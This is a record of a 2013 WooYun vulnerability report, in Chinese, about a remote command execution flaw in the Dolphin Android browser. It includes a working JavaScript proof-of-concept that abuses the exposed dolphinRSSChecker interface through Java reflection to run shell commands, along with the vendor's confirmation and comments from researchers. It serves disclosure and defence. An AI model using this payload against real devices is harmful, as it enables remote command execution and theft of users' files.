{"id": 7860, "wybug_id": "wooyun-2013-035576", "wybug_title": "海豚手机浏览器存在远程命令执行漏洞", "wybug_corp": "海豚浏览器", "wybug_author": "撸人甲", "wybug_date": "2013-09-02 18:44", "wybug_open_date": "2013-12-01 18:45", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-05：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-10-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-11-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-01：\t细节向公众公开  简要描述： 海豚手机浏览器存在远程命令执行漏洞(js代码执行系统命令) 详细说明：  漏洞存在于海豚浏览器中，不需要root即可，addJavascriptInterface导出多处。addJavascriptInterface导出到js中使用java类，可以反射导致命令执行等等利用海豚浏览器，反编译后com/dolphin/browser/extension/RSSChecker.smali中，存在\nconst-string/jumbo v1, \"dolphinRSSChecker\" invoke-interface {p1, v0, v1}, Lcom/dolphin/browser/core/IWebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V\n这里使用导出的dolphinRSSChecker，还有其他导出到js的java类也可以使用，海豚浏览器导出了多处，都注意下吧。构造exploit部分内容如下:(html文件)\n<script>function execute(cmdArgs){        alert(typeof(dolphinRSSChecker));        return dolphinRSSChecker.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(cmdArgs);}              var content = \"\\\\xff\\\\xff\";var pathcontent = \"/data/data/com.dolphin.browser.xf/files/neirong\"; execute([\"/system/bin/sh\",\"-c\",\"echo '\"+content+\"' > \" + pathcontent]);execute([\"chmod\",\"755\",pathcontent]);//execute([patharm,\"f\",upload]);</script>\n   漏洞证明：  构造上述内容调用后可以执行命令，可以做很多事情，例如上传sd卡文件，上传私有目录下的可读文件、删除文件等等。访问带有测试js代码的网站\n\n利用系统bash直接echo一个wooyun文件\n\n\n\n成功，证明可以执行系统命令！   修复方案：  限制导出类给js使用，或者对导出要做一些判断，防止恶意使用   版权声明：转载请注明来源 撸人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-09-02 17:39 厂商回复： 确认漏洞存在，正在进行可行的修复评估，谢谢提交人 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-08-29 14:57 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  我是第一个受害者啊 又一个神奇的路人甲！    \n     2013-08-29 15:03 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  这个漏洞实现了js2root了要快，巨经典！    \n     2013-08-29 15:06 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  Mark    \n     2013-08-29 15:28 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  Mark    \n     2013-08-29 17:47 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  @疯狗 js to root?    \n     2013-08-30 17:58 |    \t\tevavus \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:11        | @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@...)\t\t \n  mark    \n     2013-08-31 23:15 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  Mark    \n     2013-09-02 13:36 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @imlonghao yeah    \n     2013-09-02 17:29 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @疯狗 那么给力，快公开    \n     2013-09-02 18:33 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @wefgod 等修复啊，肯定会公开，也照顾下厂商 ：D    \n     2013-09-03 09:27 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  我是来看巨经典的    \n     2013-09-03 11:12 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @疯狗 修复了就快公开哦！    \n     2013-09-03 15:46 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @wefgod 正常走流程，没有特例啊，尊重厂商    \n     2013-09-19 10:07 |    \t\t小七 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 好好学习，天天向上)\t\t \n  苦逼，，，，，学习来了。。。。。。    \n     2013-09-23 16:52 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  不错不错    \n     2013-10-12 20:10 |    \t\t小七 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 好好学习，天天向上)\t\t \n   好神奇。。。。。。。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}